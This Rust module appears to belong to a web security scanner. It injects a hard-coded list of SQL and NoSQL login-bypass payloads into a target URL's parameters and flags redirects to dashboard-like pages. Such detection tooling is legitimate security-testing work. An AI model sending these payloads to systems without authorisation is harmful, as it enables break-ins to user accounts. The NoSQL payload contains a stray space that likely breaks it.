use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// Login Bypass detection via common SQLi/NoSQLi payloads
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: Login Bypass", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() {
        println!("{} No parameters found for Login Bypass testing", "[i]".cyan());
        return Ok(());
    }

    let client = HttpClient::new()?;
    
    let payloads = vec![
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "admin'--",
        "admin' #",
        "' OR TRUE--",
        "{\" $ne\": null}", // NoSQL
    ];
    
    for (param_name, _) in &params {
        for payload in &payloads {
            let url = Analyzer::inject_param(target, param_name, payload)?;
            let resp = client.inner.get(&url).send().await?;
            
            // Check for potential bypass (redirection to dashboard, account page, etc.)
            if resp.status().is_redirection() {
                if let Some(loc) = resp.headers().get("location") {
                    let loc_str = loc.to_str().unwrap_or("");
                    if loc_str.contains("dashboard") || loc_str.contains("account") || loc_str.contains("home") {
                        println!(
                            "{} POTENTIAL: Login Bypass in param '{}' with payload '{}'",
                            "[!]".red().bold(), param_name, payload
                        );
                        println!("    Redirected to: {}", loc_str);
                    }
                }
            }
        }
    }

    Ok(())
}
